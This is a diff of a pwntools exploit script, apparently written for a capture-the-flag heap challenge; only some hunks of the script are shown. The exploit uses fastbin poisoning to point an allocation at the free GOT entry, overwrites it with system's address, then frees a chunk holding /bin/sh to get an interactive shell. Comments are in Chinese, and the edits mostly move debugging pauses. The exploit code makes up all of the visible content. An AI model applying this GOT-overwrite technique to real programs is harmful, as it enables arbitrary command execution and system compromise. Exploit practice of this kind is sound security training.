@@ -1,5 +1,5 @@
 from pwn import * 
-from pwn import p64
+from pwn import p64,u64
 
 
 debug = 1
@@ -60,12 +60,13 @@ print(f'system_addr = {hex(system_addr)}')
 print(f'free_addr-8 = {hex(free_addr)}')
 
 add(5,0x50,p64(0x602002-8)) #向fastbin next写入free_got
-add(6,0x50,b'A'* 0x50)
-add(7,0x50,b'A'* 0x50)
 gdb.attach(r)
 pause()
+add(6,0x50,b'A'* 0x50)
+add(7,0x50,b'A'* 0x50)
+
 add(8,0x50,b'\x00'*14+p64(system_addr)) #申请的fastbin指向free_got
-pause()
+
 delete(4)
 #free且传参/bin/sh
 r.interactive()
